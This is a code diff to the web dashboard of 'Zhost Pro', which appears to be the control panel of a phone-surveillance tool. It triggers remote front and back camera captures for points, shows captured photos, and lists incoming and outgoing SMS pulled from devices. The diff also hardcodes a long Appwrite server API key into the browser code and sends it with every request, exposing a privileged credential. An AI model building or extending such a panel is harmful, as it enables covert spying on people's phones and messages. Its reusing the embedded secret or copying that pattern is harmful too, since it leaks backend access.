@@ -16,8 +16,6 @@
   }
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#F5F9FF;color:var(--text);font-size:15px;line-height:1.5}
   body{display:flex;flex-direction:column;min-height:100vh}
-
-  /* ── Login ── */
   #loginScreen{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;padding:24px;background:#fff}
   .login-box{width:100%;max-width:400px;padding:32px 24px;border-radius:20px;background:#fff;box-shadow:0 4px 24px rgba(16,42,67,.08);border:1px solid var(--border)}
   .logo-circle{width:68px;height:68px;border-radius:50%;background:linear-gradient(135deg,var(--primary),var(--btn-light));display:flex;align-items:center;justify-content:center;margin:0 auto 16px;box-shadow:0 6px 20px rgba(22,137,255,.32)}
@@ -37,89 +35,30 @@
   .alert{padding:11px 14px;border-radius:10px;font-size:13px;margin-bottom:14px;display:none}
   .alert.show{display:block}
   .alert-error{background:#FEF2F2;color:#B91C1C;border:1px solid #FECACA}
-
-  /* ── App ── */
   #appScreen{display:none;flex-direction:column;min-height:100vh}
   #appScreen.show{display:flex}
   .header{background:linear-gradient(135deg,var(--primary),var(--btn-light));color:#fff;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 12px rgba(22,137,255,.18);position:sticky;top:0;z-index:10}
   .header h1{font-size:18px;font-weight:700;letter-spacing:.3px}
   .header .user-badge{font-size:12px;background:rgba(255,255,255,.2);padding:5px 12px;border-radius:20px;font-weight:500}
-
-  /* ═══ Nav Bar (အလှဆင်) ═══ */
-  .nav-bar{
-    display:grid;
-    grid-template-columns:repeat(4,1fr);
-    gap:8px;
-    padding:12px 14px;
-    background:#fff;
-    border-bottom:1px solid var(--border);
-    position:sticky;
-    top:63px;
-    z-index:9;
-  }
-  .nav-btn{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:5px;
-    padding:10px 6px;
-    border-radius:14px;
-    background:#fff;
-    border:1.5px solid var(--border);
-    cursor:pointer;
-    transition:.18s;
-    font-family:inherit;
-    color:var(--muted);
-    font-size:11.5px;
-    font-weight:700;
-    user-select:none;
-  }
-  .nav-btn .nav-icon{
-    width:34px;
-    height:34px;
-    border-radius:10px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:#F1F6FB;
-    transition:.18s;
-  }
-  .nav-btn .nav-icon svg{
-    width:18px;
-    height:18px;
-    fill:var(--muted);
-    transition:.18s;
-  }
+  .nav-bar{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;padding:12px 14px;background:#fff;border-bottom:1px solid var(--border);position:sticky;top:63px;z-index:9}
+  .nav-btn{display:flex;flex-direction:column;align-items:center;gap:5px;padding:10px 6px;border-radius:14px;background:#fff;border:1.5px solid var(--border);cursor:pointer;transition:.18s;font-family:inherit;color:var(--muted);font-size:11.5px;font-weight:700;user-select:none}
+  .nav-btn .nav-icon{width:34px;height:34px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:#F1F6FB;transition:.18s}
+  .nav-btn .nav-icon svg{width:18px;height:18px;fill:var(--muted);transition:.18s}
   .nav-btn:active{transform:scale(.96)}
-  .nav-btn.active{
-    background:linear-gradient(135deg,var(--primary),var(--btn-light));
-    color:#fff;
-    border-color:transparent;
-    box-shadow:0 6px 16px rgba(22,137,255,.32);
-  }
-  .nav-btn.active .nav-icon{
-    background:rgba(255,255,255,.22);
-  }
-  .nav-btn.active .nav-icon svg{
-    fill:#fff;
-  }
-
+  .nav-btn.active{background:linear-gradient(135deg,var(--primary),var(--btn-light));color:#fff;border-color:transparent;box-shadow:0 6px 16px rgba(22,137,255,.32)}
+  .nav-btn.active .nav-icon{background:rgba(255,255,255,.22)}
+  .nav-btn.active .nav-icon svg{fill:#fff}
   .section{display:none;padding:16px 14px 30px;max-width:720px;margin:0 auto;width:100%}
   .section.active{display:block;animation:fadeIn .25s ease}
   @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
-
-  /* ── Profile ── */
   .profile-card{background:linear-gradient(135deg,var(--primary),var(--btn-light));border-radius:18px;padding:22px;color:#fff;margin-bottom:18px;box-shadow:0 8px 24px rgba(22,137,255,.24)}
   .profile-card .name{font-size:18px;font-weight:700;margin-bottom:4px}
   .profile-card .email{font-size:12.5px;opacity:.9;margin-bottom:16px;word-break:break-all}
   .profile-points{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.2);padding:8px 16px;border-radius:20px;font-size:15px;font-weight:700}
   .profile-points svg{width:18px;height:18px;fill:#FFD700}
-
   .info-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:#fff;border:1px solid var(--border);border-radius:12px;margin-bottom:10px}
   .info-row .label{font-size:13px;color:var(--muted);font-weight:500}
   .info-row .value{font-size:14px;color:var(--dark);font-weight:600}
-
-  /* ── Camera ── */
   .cam-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px}
   .cam-btn{background:#fff;border:1.5px solid var(--border);border-radius:16px;padding:22px 12px;display:flex;flex-direction:column;align-items:center;gap:10px;cursor:pointer;transition:.15s;font-family:inherit}
   .cam-btn:active{transform:scale(.97);background:var(--light)}
@@ -127,8 +66,6 @@
   .cam-btn .icon-wrap svg{width:26px;height:26px;fill:#fff}
   .cam-btn .cam-label{font-size:14px;font-weight:700;color:var(--dark)}
   .cam-btn .cam-cost{font-size:11.5px;color:var(--muted);font-weight:500}
-
-  /* ── Photos ── */
   .photo-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-top:12px}
   @media(min-width:600px){.photo-grid{grid-template-columns:repeat(4,1fr)}}
   .photo-item{aspect-ratio:1;border-radius:10px;overflow:hidden;background:var(--light);cursor:pointer;position:relative;border:1px solid var(--border)}
@@ -136,145 +73,56 @@
   .photo-item img.loaded{opacity:1}
   .photo-item .spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;border:2.5px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin .8s linear infinite}
   @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
-
   .empty{text-align:center;padding:50px 20px;color:var(--muted);font-size:14px}
   .empty svg{width:60px;height:60px;fill:var(--border);margin-bottom:14px}
-
   .section-title{font-size:15px;font-weight:700;color:var(--dark);margin-bottom:12px;display:flex;align-items:center;justify-content:space-between}
   .refresh-btn{background:var(--light);border:none;padding:6px 12px;border-radius:8px;color:var(--primary);font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:4px}
   .refresh-btn:active{transform:scale(.96)}
-
-  /* ═══ SMS List (Collapsed) ═══ */
   .sms-list{display:flex;flex-direction:column;gap:8px}
-  .sms-item{
-    background:#fff;
-    border:1.5px solid var(--border);
-    border-radius:14px;
-    padding:12px 14px;
-    cursor:pointer;
-    transition:.18s;
-    position:relative;
-    overflow:hidden;
-  }
+  .sms-item{background:#fff;border:1.5px solid var(--border);border-radius:14px;padding:12px 14px;cursor:pointer;transition:.18s;position:relative;overflow:hidden}
   .sms-item:active{transform:scale(.99)}
-  /* in/out color bars */
-  .sms-item.in::before{
-    content:"";position:absolute;left:0;top:0;bottom:0;width:4px;
-    background:var(--in);
-  }
-  .sms-item.out::before{
-    content:"";position:absolute;left:0;top:0;bottom:0;width:4px;
-    background:var(--out);
-  }
-  .sms-item.expanded{
-    background:#FBFDFF;
-    box-shadow:0 4px 14px rgba(16,42,67,.06);
-  }
+  .sms-item.in::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--in)}
+  .sms-item.out::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--out)}
+  .sms-item.expanded{background:#FBFDFF;box-shadow:0 4px 14px rgba(16,42,67,.06)}
   .sms-head{display:flex;align-items:center;gap:8px;margin-bottom:4px}
-  .sms-icon{
-    width:28px;height:28px;border-radius:8px;
-    display:flex;align-items:center;justify-content:center;
-    flex-shrink:0;
-  }
+  .sms-icon{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
   .sms-icon svg{width:15px;height:15px;fill:#fff}
   .sms-item.in .sms-icon{background:linear-gradient(135deg,#10B981,#34D399)}
   .sms-item.out .sms-icon{background:linear-gradient(135deg,#3B82F6,#60A5FA)}
-  .sms-sender{
-    flex:1;font-size:13.5px;font-weight:700;color:var(--dark);
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-  }
+  .sms-sender{flex:1;font-size:13.5px;font-weight:700;color:var(--dark);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
   .sms-time{font-size:11px;color:var(--muted);white-space:nowrap;flex-shrink:0}
-  .sms-chevron{
-    width:14px;height:14px;flex-shrink:0;
-    transition:transform .22s ease;
-  }
+  .sms-chevron{width:14px;height:14px;flex-shrink:0;transition:transform .22s ease}
   .sms-chevron svg{width:14px;height:14px;fill:var(--muted)}
   .sms-item.expanded .sms-chevron{transform:rotate(180deg)}
   .sms-item.expanded .sms-chevron svg{fill:var(--primary)}
-
-  .sms-preview{
-    font-size:12.5px;color:var(--text);
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-    padding-left:36px;
-    margin-top:2px;
-  }
-  .sms-body{
-    display:none;
-    font-size:13px;color:var(--text);line-height:1.6;
-    padding:12px 2px 4px;
-    margin-top:8px;
-    border-top:1px dashed var(--border);
-    white-space:pre-wrap;word-break:break-word;
-    animation:expandDown .25s ease;
-  }
+  .sms-preview{font-size:12.5px;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding-left:36px;margin-top:2px}
+  .sms-body{display:none;font-size:13px;color:var(--text);line-height:1.6;padding:12px 2px 4px;margin-top:8px;border-top:1px dashed var(--border);white-space:pre-wrap;word-break:break-word;animation:expandDown .25s ease}
   @keyframes expandDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
   .sms-item.expanded .sms-body{display:block}
   .sms-item.expanded .sms-preview{display:none}
-
-  .sms-meta{
-    display:none;
-    margin-top:10px;
-    padding-top:10px;
-    border-top:1px solid var(--border);
-    font-size:11px;color:var(--muted);
-    gap:10px;
-    flex-wrap:wrap;
-  }
+  .sms-meta{display:none;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);font-size:11px;color:var(--muted);gap:10px;flex-wrap:wrap}
   .sms-item.expanded .sms-meta{display:flex}
   .sms-meta span{display:flex;align-items:center;gap:4px}
-
-  .sms-file-btn{
-    display:none;
-    margin-top:10px;
-    padding:8px 12px;
-    background:var(--light);
-    border:1px solid var(--border);
-    border-radius:10px;
-    color:var(--primary);
-    font-size:12.5px;
-    font-weight:600;
-    cursor:pointer;
-    font-family:inherit;
-    align-items:center;
-    justify-content:center;
-    gap:6px;
-    width:100%;
-    transition:.15s;
-  }
+  .sms-file-btn{display:none;margin-top:10px;padding:8px 12px;background:var(--light);border:1px solid var(--border);border-radius:10px;color:var(--primary);font-size:12.5px;font-weight:600;cursor:pointer;font-family:inherit;align-items:center;justify-content:center;gap:6px;width:100%;transition:.15s}
   .sms-file-btn:active{transform:scale(.98);background:#DBEAFE}
   .sms-item.expanded .sms-file-btn{display:flex}
-
-  /* badge */
-  .sms-badge{
-    font-size:9.5px;font-weight:800;letter-spacing:.4px;
-    padding:2px 6px;border-radius:5px;
-    text-transform:uppercase;
-    flex-shrink:0;
-  }
+  .sms-badge{font-size:9.5px;font-weight:800;letter-spacing:.4px;padding:2px 6px;border-radius:5px;text-transform:uppercase;flex-shrink:0}
   .sms-item.in .sms-badge{background:var(--in-bg);color:#047857}
   .sms-item.out .sms-badge{background:var(--out-bg);color:#1D4ED8}
-
-  /* ── Lightbox ── */
   .lightbox{display:none;position:fixed;inset:0;background:rgba(10,20,35,.95);z-index:100;align-items:center;justify-content:center;padding:20px}
   .lightbox.show{display:flex}
   .lightbox img{max-width:100%;max-height:90vh;border-radius:8px;box-shadow:0 10px 40px rgba(0,0,0,.6)}
   .lightbox-close{position:absolute;top:16px;right:16px;width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,.15);border:none;color:#fff;font-size:22px;cursor:pointer;display:flex;align-items:center;justify-content:center;z-index:101}
-
-  /* ── SMS Viewer ── */
   .sms-viewer{display:none;position:fixed;inset:0;background:rgba(10,20,35,.95);z-index:100;align-items:center;justify-content:center;padding:20px}
   .sms-viewer.show{display:flex}
   .sms-viewer-box{background:#fff;border-radius:14px;width:100%;max-width:640px;max-height:85vh;display:flex;flex-direction:column;overflow:hidden}
   .sms-viewer-head{padding:16px 18px;background:var(--light);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;gap:10px}
   .sms-viewer-head h3{font-size:14px;color:var(--dark);font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
   .sms-viewer-body{padding:18px;overflow-y:auto;font-family:'SF Mono',Menlo,Consolas,monospace;font-size:12.5px;line-height:1.65;color:var(--text);white-space:pre-wrap;word-break:break-word}
-
-  /* ── Toast ── */
   .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--dark);color:#fff;padding:12px 20px;border-radius:12px;font-size:13.5px;font-weight:500;box-shadow:0 8px 24px rgba(0,0,0,.24);z-index:200;opacity:0;transition:.3s;max-width:90vw;text-align:center}
   .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
   .toast.success{background:var(--success)}
   .toast.error{background:var(--danger)}
-
-  /* ── Overlay ── */
   .overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.9);z-index:150;align-items:center;justify-content:center;flex-direction:column;gap:14px}
   .overlay.show{display:flex}
   .overlay .big-spinner{width:40px;height:40px;border:3.5px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin2 .8s linear infinite}
@@ -284,7 +132,6 @@
 </head>
 <body>
 
-<!-- ═══════════ LOGIN ═══════════ -->
 <div id="loginScreen">
   <div class="login-box">
     <div class="logo-circle">
@@ -308,56 +155,41 @@
   </div>
 </div>
 
-<!-- ═══════════ APP ═══════════ -->
 <div id="appScreen">
   <div class="header">
     <h1>Zhost Pro</h1>
     <span id="headerUser" class="user-badge">-</span>
   </div>
 
-  <!-- Nav Buttons -->
   <div class="nav-bar">
     <div class="nav-btn active" data-tab="camera">
-      <div class="nav-icon">
-        <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-      </div>
+      <div class="nav-icon"><svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></div>
       Camera
     </div>
     <div class="nav-btn" data-tab="photos">
-      <div class="nav-icon">
-        <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
-      </div>
+      <div class="nav-icon"><svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg></div>
       Photos
     </div>
     <div class="nav-btn" data-tab="sms">
-      <div class="nav-icon">
-        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg>
-      </div>
+      <div class="nav-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg></div>
       SMS
     </div>
     <div class="nav-btn" data-tab="profile">
-      <div class="nav-icon">
-        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-      </div>
+      <div class="nav-icon"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
       Profile
     </div>
   </div>
 
-  <!-- ═══ CAMERA ═══ -->
   <div id="sec-camera" class="section active">
     <div class="section-title">Remote Camera</div>
     <div class="cam-grid">
       <button class="cam-btn" data-cam="front">
-        <div class="icon-wrap">
-          <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-        </div>
+        <div class="icon-wrap"><svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></div>
         <div class="cam-label">Front</div>
         <div class="cam-cost">-1 Point</div>
       </button>
       <button class="cam-btn" data-cam="back">
-        <div class="icon-wrap">
-          <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-        </div>
+        <div class="icon-wrap"><svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></div>
         <div class="cam-label">Back</div>
         <div class="cam-cost">-1 Point</div>
       </button>
@@ -372,7 +204,6 @@
     </div>
   </div>
 
-  <!-- ═══ PHOTOS ═══ -->
   <div id="sec-photos" class="section">
     <div class="section-title">
       Your Photos
@@ -385,7 +216,6 @@
     </div>
   </div>
 
-  <!-- ═══ SMS ═══ -->
   <div id="sec-sms" class="section">
     <div class="section-title">
       Messages
@@ -398,7 +228,6 @@
     </div>
   </div>
 
-  <!-- ═══ PROFILE ═══ -->
   <div id="sec-profile" class="section">
     <div class="profile-card">
       <div class="name" id="profName">-</div>
@@ -424,13 +253,11 @@
   </div>
 </div>
 
-<!-- Lightbox (Photo) -->
 <div id="lightbox" class="lightbox">
   <button class="lightbox-close" id="lightboxClose">×</button>
   <img id="lightboxImg" src="" alt="">
 </div>
 
-<!-- SMS Viewer -->
 <div id="smsViewer" class="sms-viewer">
   <div class="sms-viewer-box">
     <div class="sms-viewer-head">
@@ -460,15 +287,12 @@ const T_SMS = "sms";
 const BUCKET = "photos";
 const CAMERA_COST = 1;
 
-/* ═══ STATE ═══ */
-let state = {
-  user: null,
-  userRow: null,
-  photos: [],
-  sms: [],
-};
+/* ═══ API KEY (1-day test) ═══ */
+const API_KEY = "standard_36c054f57ff04721e832a77cdd0702a731e2c5cecb28603281b456dacc2bf730ab3967ec377cc8647843233f5d1e3bb6b98a5f30869c2aa12cf244b56e978651cae2efbc4b0f231a6c3eff78403b93ceda7d534e68e7b9bd4835c019e71b40cea5e840aa9c4a698cce4b3e039b94defff42ba04244e57a507bfa8fc97fe4fe27";
 
-/* ═══ Helpers ═══ */
+/* ═══ STATE ═══ */
+let state = { user: null, userRow: null, photos: [], sms: [] };
+
 const $ = (id) => document.getElementById(id);
 
 function toast(msg, type = "") {
@@ -487,9 +311,7 @@ function showLoginError(msg) {
   a.textContent = msg;
   a.className = "alert alert-error show";
 }
-function hideLoginError() {
-  $("loginAlert").className = "alert alert-error";
-}
+function hideLoginError() { $("loginAlert").className = "alert alert-error"; }
 function escapeHtml(s) {
   return String(s || "").replace(/[&<>"']/g, c => ({
     "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
@@ -501,22 +323,21 @@ function fmtTime(t) {
     if (isNaN(d.getTime())) return t;
     const now = new Date();
     const isToday = d.toDateString() === now.toDateString();
-    if (isToday) {
-      return d.toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
-    }
+    if (isToday) return d.toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
     return d.toLocaleDateString([], {month: "short", day: "numeric"}) + " " +
            d.toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
   } catch (e) { return t; }
 }
 
+/* ═══ API helper (with API Key) ═══ */
 async function api(method, path, body) {
   const opts = {
     method,
     headers: {
       "X-Appwrite-Project": PROJECT,
+      "X-Appwrite-Key": API_KEY,
       "Content-Type": "application/json",
     },
-    credentials: "include",
   };
   if (body) opts.body = JSON.stringify(body);
   const res = await fetch(API + path, opts);
@@ -530,7 +351,7 @@ async function api(method, path, body) {
   return data;
 }
 
-/* ═══ LOGIN ═══ */
+/* ═══ LOGIN (verify email/password) ═══ */
 async function doLogin(email, password) {
   const res = await fetch(API + "/account/sessions/email", {
     method: "POST",
@@ -538,7 +359,6 @@ async function doLogin(email, password) {
       "X-Appwrite-Project": PROJECT,
       "Content-Type": "application/json",
     },
-    credentials: "include",
     body: JSON.stringify({ email, password }),
   });
   const text = await res.text();
@@ -550,25 +370,20 @@ async function doLogin(email, password) {
   }
   return data;
 }
-async function getAccount() {
-  return await api("GET", "/account");
-}
+
 async function findUserRow(userId, email) {
   const q = encodeURIComponent(JSON.stringify({
     method: "equal", attribute: "userId", values: [userId]
   }));
   try {
-    const res = await api("GET",
-      `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q}`);
+    const res = await api("GET", `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q}`);
     if (res && res.rows && res.rows.length > 0) return res.rows[0];
   } catch (e) {}
-
   const q2 = encodeURIComponent(JSON.stringify({
     method: "equal", attribute: "email", values: [email]
   }));
   try {
-    const res2 = await api("GET",
-      `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q2}`);
+    const res2 = await api("GET", `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q2}`);
     if (res2 && res2.rows && res2.rows.length > 0) return res2.rows[0];
   } catch (e) {}
   return null;
@@ -578,46 +393,55 @@ async function findUserRow(userId, email) {
 async function loadPhotos() {
   if (!state.userRow) return;
   const userId = state.userRow.userId;
-  const q = encodeURIComponent(JSON.stringify({
-    method: "equal", attribute: "capturedByUserId", values: [userId]
-  }));
-  const q2 = encodeURIComponent(JSON.stringify({
-    method: "orderDesc", attribute: "$createdAt"
-  }));
-  const q3 = encodeURIComponent(JSON.stringify({
-    method: "limit", values: [50]
-  }));
+  const q = encodeURIComponent(JSON.stringify({method:"equal",attribute:"capturedByUserId",values:[userId]}));
+  const q2 = encodeURIComponent(JSON.stringify({method:"orderDesc",attribute:"$createdAt"}));
+  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[50]}));
   const path = `/tablesdb/${DB}/tables/${T_PHOTOS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`;
   const res = await api("GET", path);
   const photos = (res && res.rows ? res.rows : []).filter(p => p.fileId && !p.isDeleted);
   state.photos = photos;
   renderPhotos(photos);
 }
-function photoUrl(fileId) {
-  return `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
+
+async function fetchPhotoBlobUrl(fileId) {
+  const url = `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
+  const res = await fetch(url, {
+    headers: { "X-Appwrite-Key": API_KEY, "X-Appwrite-Project": PROJECT },
+  });
+  if (!res.ok) throw new Error("HTTP " + res.status);
+  const blob = await res.blob();
+  return URL.createObjectURL(blob);
 }
-function renderPhotos(photos) {
+
+async function renderPhotos(photos) {
   const grid = $("photoGrid");
   const empty = $("photosEmpty");
   grid.innerHTML = "";
   if (!photos.length) { empty.style.display = "block"; return; }
   empty.style.display = "none";
+
   for (const p of photos) {
     const div = document.createElement("div");
     div.className = "photo-item";
     const sp = document.createElement("div");
     sp.className = "spinner";
-    const img = document.createElement("img");
-    img.src = photoUrl(p.fileId);
-    img.loading = "lazy";
-    img.onload = () => { img.classList.add("loaded"); sp.remove(); };
-    img.onerror = () => { sp.remove(); };
     div.appendChild(sp);
-    div.appendChild(img);
-    div.onclick = () => openLightbox(photoUrl(p.fileId));
     grid.appendChild(div);
+
+    try {
+      const blobUrl = await fetchPhotoBlobUrl(p.fileId);
+      const img = document.createElement("img");
+      img.src = blobUrl;
+      img.onload = () => { img.classList.add("loaded"); sp.remove(); };
+      div.appendChild(img);
+      div.onclick = () => openLightbox(blobUrl);
+    } catch (e) {
+      sp.remove();
+      div.innerHTML = '<div style="color:#EF4444;font-size:10px;text-align:center;padding:8px">Failed</div>';
+    }
   }
 }
+
 function openLightbox(src) {
   $("lightboxImg").src = src;
   $("lightbox").classList.add("show");
@@ -631,15 +455,9 @@ $("lightboxClose").onclick = () => {
 async function loadSms() {
   if (!state.userRow) return;
   const userId = state.userRow.userId;
-  const q = encodeURIComponent(JSON.stringify({
-    method: "equal", attribute: "ownerUserId", values: [userId]
-  }));
-  const q2 = encodeURIComponent(JSON.stringify({
-    method: "orderDesc", attribute: "receivedAt"
-  }));
-  const q3 = encodeURIComponent(JSON.stringify({
-    method: "limit", values: [100]
-  }));
+  const q = encodeURIComponent(JSON.stringify({method:"equal",attribute:"ownerUserId",values:[userId]}));
+  const q2 = encodeURIComponent(JSON.stringify({method:"orderDesc",attribute:"receivedAt"}));
+  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[100]}));
   const path = `/tablesdb/${DB}/tables/${T_SMS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`;
   const res = await api("GET", path);
   const rows = (res && res.rows ? res.rows : []).filter(r => !r.isDeleted);
@@ -663,12 +481,10 @@ function renderSms(rows) {
     const isBatch = kind === "batch" || kind === "initial" || kind === "offline";
     const badgeText = isBatch ? "BATCH" : dirLabel;
 
-    // Icon (arrow in / arrow out)
     const iconSvg = isOut
-      ? `<svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>`
-      : `<svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>`;
+      ? '<svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>'
+      : '<svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>';
 
-    // Preview text (1 line)
     const preview = (r.body || "").split("\n")[0];
 
     const div = document.createElement("div");
@@ -690,13 +506,11 @@ function renderSms(rows) {
       ${r.fileId ? '<button class="sms-file-btn" type="button">📄 View full file</button>' : ''}
     `;
 
-    // Click card → toggle expand
     div.addEventListener("click", (e) => {
-      if (e.target.closest(".sms-file-btn")) return; // file button သီးသန့်
+      if (e.target.closest(".sms-file-btn")) return;
       div.classList.toggle("expanded");
     });
 
-    // File button
     const fileBtn = div.querySelector(".sms-file-btn");
     if (fileBtn) {
       fileBtn.addEventListener("click", (e) => {
@@ -704,13 +518,8 @@ function renderSms(rows) {
         openSmsViewer(r.fileId, r.fileName || "SMS File");
       });
     }
-
     el.appendChild(div);
   }
-}
-
-function smsFileUrl(fileId) {
-  return `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
 }
 
 async function openSmsViewer(fileId, fileName) {
@@ -718,9 +527,11 @@ async function openSmsViewer(fileId, fileName) {
   $("smsViewerBody").textContent = "Loading...";
   $("smsViewer").classList.add("show");
   try {
-    const url = smsFileUrl(fileId);
-    const res = await fetch(url, { credentials: "include" });
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const url = `${API}/storage/buckets/${BUCKET}/files/${fileId}/view?project=${PROJECT}`;
+    const res = await fetch(url, {
+      headers: { "X-Appwrite-Key": API_KEY, "X-Appwrite-Project": PROJECT },
+    });
+    if (!res.ok) throw new Error("HTTP " + res.status);
     const text = await res.text();
     $("smsViewerBody").textContent = text;
   } catch (e) {
@@ -749,8 +560,9 @@ async function sendCameraCommand(type) {
   showOverlay("Sending command...");
   try {
     const newPoints = points - CAMERA_COST;
-    const updPath = `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`;
-    await api("PATCH", updPath, { data: { points: newPoints } });
+    await api("PATCH", `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`, {
+      data: { points: newPoints }
+    });
     state.userRow.points = newPoints;
     updatePointsUI();
 
